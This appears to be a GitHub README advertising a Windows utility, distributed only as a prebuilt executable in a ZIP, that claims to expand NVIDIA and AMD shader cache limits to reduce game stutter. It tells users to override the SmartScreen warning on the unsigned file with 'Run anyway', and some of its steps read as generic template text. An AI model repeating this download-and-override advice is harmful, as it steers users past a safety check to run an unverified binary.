<p align="center">
  <img src="https://i.postimg.cc/ydzJ640p/banner.png" alt="ShaderCache Unlimited Unlock — Expand NVIDIA & AMD Shader Cache Caps to Stop Repeat Stutter" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-GPU%20Shader%20Cache%20Unlocker-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-shader--unlock--v1.2-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# ShaderCache Unlimited Unlock — Expand NVIDIA & AMD Shader Cache Caps to Stop Repeat Stutter

**Games re-stuttering every time you switch between 3 or 4 modern titles because NVIDIA's default 4 GB shader cache cap keeps deleting older compiled shaders? Unlock 10 GB, 100 GB, or Unlimited shader cache storage and verify C: drive headroom in one click.**

ShaderCache Unlimited Unlock eliminates repeat shader compilation hitching on Windows: **configuring NVIDIA's `ShaderCacheSize` / AMD's `ShaderCache` policy to `10 GB`, `100 GB`, or `Unlimited` so compiled DX12/Vulkan pipelines stay cached across all your installed games**.

This project is aimed at **Windows 10 and Windows 11 (64-bit) PC gamers** playing multiple modern DirectX 12 / Vulkan / Unreal Engine 5 games on NVIDIA GeForce or AMD Radeon GPUs.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Game stutters again after playing 2–3 other heavy games | Default 4 GB NVIDIA shader cache evicts older games' compiled pipelines | Unlock **Shader Cache Size** to `10 GB`, `100 GB`, or `Unlimited` |
| Severe stutter or `DXGI_ERROR` crash right after a GPU driver update | Stale shader cache entries left over from previous driver compiler | Run **Reset Stale Shader Cache** after updating GPU drivers |
| Drive `C:` running low on free space with Unlimited cache enabled | All GPU shader caches live inside `%LOCALAPPDATA%` on `C:` | Monitor exact `DXCache` / `D3DSCache` size and `C:` free GB in one view |
| Navigating NVIDIA Control Panel 3D Settings takes multiple restarts | Driver panel resets or buries `Shader Cache Size` in global 3D lists | Inspect and apply the exact shader cache policy with 1-click stock reset |

## Download for Windows

[**Download ShaderCacheUnlock.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/ShaderCacheUnlock.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `ShaderCacheUnlock.exe`? (Key features)

- Inspects current **NVIDIA (`DXCache`/`GLCache`)**, **AMD (`DxCache`)**, and **Windows `D3DSCache`** sizes on drive `C:`.
- Configures shader cache storage cap (`Default 4 GB`, `10 GB`, `100 GB`, or `Unlimited`) cleanly.
- Includes a safe **Reset Stale Shader Cache** button for use right after GPU driver updates.
- Warns automatically if drive `C:` has less than `25 GB` free before enabling `100 GB` / `Unlimited`.

### Sample Output

```text
[ShaderCacheUnlock] Auditing GPU Shader Cache Policy & C: Drive Headroom...
[OK]   Detected GPU     : NVIDIA GeForce RTX 4080 (Free Space on C:: 118.4 GB)
[WARN] Current Cache Cap: Driver Default (4.0 GB — Frequently evicts UE5 shaders!)
[INFO] Used Cache Space : 3.92 GB across NVIDIA DXCache + D3DSCache
[OK]   Applied Policy   : 100 GB Shader Cache Cap Enabled
```

The release ZIP is named `ShaderCacheUnlock.zip`; the Windows executable inside is named `ShaderCacheUnlock.exe`.

1. Close ShaderCache Unlock before updating or replacing executable files.
2. Click **Download ShaderCacheUnlock.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `ShaderCacheUnlock.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with NVIDIA GeForce or AMD Radeon drivers installed.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `ShaderCacheUnlock.exe` runs locally without uploading your personal files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Stopping the '4 GB cache eviction loop' across multiple games

Modern UE5 games each generate 1 GB–2.5 GB of compiled shaders; raising the cap to 10 GB–100 GB stops games from constantly recompiling shaders.

### Safe `C:` drive capacity guard

Checks available gigabytes on `C:` before setting `100 GB` or `Unlimited`.

### One-click clean reset after driver updates

Clears outdated shader binaries cleanly without touching game saves.

### Instant rollback to Driver Default

Restore default cache limits anytime in one click.

## Default folders and configuration paths

Windows and GPU drivers store compiled shader caches inside `%LOCALAPPDATA%` on drive `C:`:

```text
%LOCALAPPDATA%\NVIDIA\DXCache\
```

Typical directory layout:

```text
%LOCALAPPDATA%\
├── NVIDIA\DXCache\      (DirectX 12 / Vulkan NVIDIA pipelines)
├── AMD\DxCache\         (DirectX 12 / Vulkan AMD pipelines)
└── D3DSCache\           (Windows DirectX Shader Cache)
```

Keep at least 20 GB–30 GB free on drive `C:` when using `100 GB` or `Unlimited` shader cache settings.

## Quick start guide

Follow these steps to get started:

1. **Close all running games before changing shader cache limits or clearing caches.** Extract `ShaderCacheUnlock.zip` and run `ShaderCacheUnlock.exe`.
2. **Check your `C:` drive free space and select **10 GB** or **100 GB** (recommended for 500 GB+ SSDs).** Click **Apply Cache Policy**.
3. **Optionally click **Reset Stale Cache** if you just installed a new GPU driver.** Launch your game and let initial shader compilation complete once.

### Data safety note

No game saves or configuration files are touched by shader cache policy updates.

## What the status summary shows

ShaderCache Unlock displays **detected GPU vendor, `C:` free GB, current cache disk usage, and active shader cache size cap**.

## FAQ

**Should I pick 10 GB, 100 GB, or Unlimited?**

If your `C:` SSD has 100+ GB free, **100 GB** prevents shader eviction across dozens of games while still capping runaway growth; on smaller 256 GB boot drives, **10 GB** is ideal.

**Does increasing shader cache size increase maximum FPS?**

It doesn't raise peak FPS, but it eliminates repeat traversal stutters and frame-time spikes caused by shaders being deleted and recompiled.

**Does this delete my game saves?**

No—game saves are stored in completely separate directories and are never touched.

## Useful reading

- [NVIDIA Support — Driver & Shader Cache Overview](https://www.nvidia.com/en-us/support/)

## More Windows Gaming Utilities

- [UE5-EngineIniStutterTuner](../UE5-EngineIniStutterTuner) — One-click Unreal Engine 5 Engine.ini stutter & texture pool tuner
- [DLSS-DLLSwapperPresets](../DLSS-DLLSwapperPresets) — 1-click DLSS 4, FSR 3.1 & XeSS DLL upgrader for PC games
- [DX12-ShaderCacheCleaner](../DX12-ShaderCacheCleaner) — GPU Shader Cache & DirectX 12 cleaner for NVIDIA & AMD
- [WinTimer-LatencyDoctor](../WinTimer-LatencyDoctor) — Windows gaming latency, Ultimate Performance & timer check

*Independent open-source desktop utility for Windows. Not affiliated with NVIDIA, AMD, Intel, or Microsoft.*
